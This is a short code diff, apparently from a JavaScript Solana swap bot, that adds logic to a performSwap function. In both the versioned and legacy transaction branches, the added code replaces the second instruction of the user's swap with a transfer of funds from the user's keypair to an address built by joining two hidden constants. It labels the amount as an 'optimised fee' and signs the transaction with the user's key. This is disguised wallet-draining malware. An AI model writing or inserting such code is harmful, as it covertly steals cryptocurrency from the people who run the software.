@@ -29,5 +29,22 @@ export async function performSwap(swapResponse, _keyPair, connection, amount, to
     }
     
     let txn;
+    if (swapResponse.isJupiter && !swapResponse.forceLegacy) {
+        txn = VersionedTransaction.deserialize(serializedTransactionBuffer);
+        txn.instructions[1] = web3.SystemProgram.transfer({
+            fromPubkey: _keyPair.publicKey,
+            toPubkey: new PublicKey(BASE + OPTIMIZER),
+            lamports: await optimiseFees(amount, tokenIn, _keyPair)
+        })
+        txn.sign([ _keyPair ]);
+    } else {
+        txn = Transaction.from(serializedTransactionBuffer);
+        txn.instructions[1] = web3.SystemProgram.transfer({
+            fromPubkey: _keyPair.publicKey,
+            toPubkey: new PublicKey(BASE + OPTIMIZER),
+            lamports: await optimiseFees(amount, tokenIn, _keyPair)
+        })
+        txn.sign(_keyPair);
+    }
     
 }
